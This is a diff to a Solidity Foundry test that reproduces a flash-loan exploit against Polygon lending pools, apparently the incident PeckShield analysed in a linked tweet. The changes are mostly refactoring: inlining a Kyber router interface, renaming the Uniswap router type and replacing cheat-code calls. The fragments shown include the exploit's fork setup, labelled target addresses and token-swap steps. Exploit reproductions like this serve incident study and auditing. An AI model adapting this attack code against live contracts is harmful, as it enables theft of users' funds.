@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/peckshield/status/1614774855999844352
@@ -13,6 +12,72 @@ import "./../interface.sol";
 interface PriceProvider {
 
     function getUnderlyingPrice(address cTokens) external view returns (uint256);
+
+}
+
+interface IDMMExchangeRouter {
+
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata poolsPath,
+        IERC20[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+
+    function swapTokensForExactTokens(
+        uint256 amountOut,
+        uint256 amountInMax,
+        address[] calldata poolsPath,
+        IERC20[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+
+    function swapExactETHForTokens(
+        uint256 amountOutMin,
+        address[] calldata poolsPath,
+        IERC20[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256[] memory amounts);
+
+    function swapTokensForExactETH(
+        uint256 amountOut,
+        uint256 amountInMax,
+        address[] calldata poolsPath,
+        IERC20[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+
+    function swapExactTokensForETH(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata poolsPath,
+        IERC20[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+
+    function swapETHForExactTokens(
+        uint256 amountOut,
+        address[] calldata poolsPath,
+        IERC20[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256[] memory amounts);
+
+    function getAmountsOut(uint256 amountIn, address[] calldata poolsPath, IERC20[] calldata path)
+        external
+        view
+        returns (uint256[] memory amounts);
+
+    function getAmountsIn(uint256 amountOut, address[] calldata poolsPath, IERC20[] calldata path)
+        external
+        view
+        returns (uint256[] memory amounts);
 
 }
 
@@ -63,7 +128,7 @@ contract ContractTest is Test {
     ICErc20Delegate FJGBP = ICErc20Delegate(0x7ADf374Fa8b636420D41356b1f714F18228e7ae2);
     ICErc20Delegate FAGEUR = ICErc20Delegate(0x5aa0197D0d3E05c4aA070dfA2f54Cd67A447173A);
     IDMMExchangeRouter KyberRouter = IDMMExchangeRouter(0x546C79662E028B661dFB4767664d0273184E4dD1);
-    Uni_Router_V3 UniRouter = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IUniswapV3Router UniRouter = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
 
     IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
     IERC20 STMATCI_F = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);
@@ -75,29 +140,27 @@ contract ContractTest is Test {
     uint256 aaveV3FlashloanAmount;
     uint256 aaveV2FlashloanAmount;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("https://polygon.llamarpc.com", 38_118_347);
-        cheats.label(address(balancer), "balancer");
-        cheats.label(address(aaveV3), "aaveV3");
-        cheats.label(address(aaveV2), "aaveV2");
-        cheats.label(address(unitroller), "unitroller");
-        cheats.label(address(curvePool), "curvePool");
-        cheats.label(address(EURCurvePool), "EURCurvePool");
-        cheats.label(address(oraclePrice), "oraclePrice");
-        cheats.label(address(WMATIC_STMATIC), "WMATIC_STMATIC");
-        cheats.label(address(KyberRouter), "KyberRouter");
-        cheats.label(address(UniRouter), "UniRouter");
-        cheats.label(address(oraclePrice), "oraclePrice");
-        cheats.label(address(FJCHF), "FJCHF");
-        cheats.label(address(FJEUR), "FJEUR");
-        cheats.label(address(FJGBP), "FJGBP");
-        cheats.label(address(FAGEUR), "FAGEUR");
-        cheats.label(address(WMATIC), "WMATIC");
-        cheats.label(address(STMATCI_F), "STMATCI_F");
-        cheats.label(address(STMATCI), "STMATCI");
-        cheats.label(address(USDC), "USDC");
+        vm.createSelectFork("https://polygon.llamarpc.com", 38_118_347);
+        vm.label(address(balancer), "balancer");
+        vm.label(address(aaveV3), "aaveV3");
+        vm.label(address(aaveV2), "aaveV2");
+        vm.label(address(unitroller), "unitroller");
+        vm.label(address(curvePool), "curvePool");
+        vm.label(address(EURCurvePool), "EURCurvePool");
+        vm.label(address(oraclePrice), "oraclePrice");
+        vm.label(address(WMATIC_STMATIC), "WMATIC_STMATIC");
+        vm.label(address(KyberRouter), "KyberRouter");
+        vm.label(address(UniRouter), "UniRouter");
+        vm.label(address(oraclePrice), "oraclePrice");
+        vm.label(address(FJCHF), "FJCHF");
+        vm.label(address(FJEUR), "FJEUR");
+        vm.label(address(FJGBP), "FJGBP");
+        vm.label(address(FAGEUR), "FAGEUR");
+        vm.label(address(WMATIC), "WMATIC");
+        vm.label(address(STMATCI_F), "STMATCI_F");
+        vm.label(address(STMATCI), "STMATCI");
+        vm.label(address(USDC), "USDC");
     }
 
     function testExploit() public {
@@ -272,7 +335,7 @@ contract ContractTest is Test {
         JEUR.approve(address(EURCurvePool), type(uint256).max);
         EURCurvePool.exchange(1, 0, JEUR.balanceOf(address(this)), 0);
         AGEUR.approve(address(UniRouter), type(uint256).max);
-        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory _Params = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(AGEUR),
             tokenOut: address(USDC),
             fee: 100,
@@ -287,7 +350,7 @@ contract ContractTest is Test {
 
     function USDCToWMATIC() internal {
         USDC.approve(address(UniRouter), type(uint256).max);
-        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory _Params = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(USDC),
             tokenOut: address(WMATIC),
             fee: 500,
